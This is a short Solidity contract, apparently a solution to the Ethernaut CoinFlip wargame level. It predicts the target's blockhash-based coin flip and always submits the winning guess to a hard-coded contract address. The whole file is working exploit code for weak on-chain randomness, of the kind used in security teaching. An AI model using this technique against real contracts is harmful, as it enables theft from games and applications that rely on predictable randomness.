// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool); 
}

contract Level03_CoinFlip {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public originalContract = CoinFlip(address(0x29A3a2842f3F77e5924BB9F8E0Bc8097924a18f6)); 


    function blockhasFor(uint _blocknumber) public view returns (uint256) {
        return uint256(blockhash(_blocknumber));
    }

    function myFlip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1 ));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // If I guessed correctly, submit my guess
        if (side == _guess) {
            return originalContract.flip(_guess);
        } else {
        // If I guess incorrectly, submit the opposite
            return originalContract.flip(!_guess);
        }
    }

}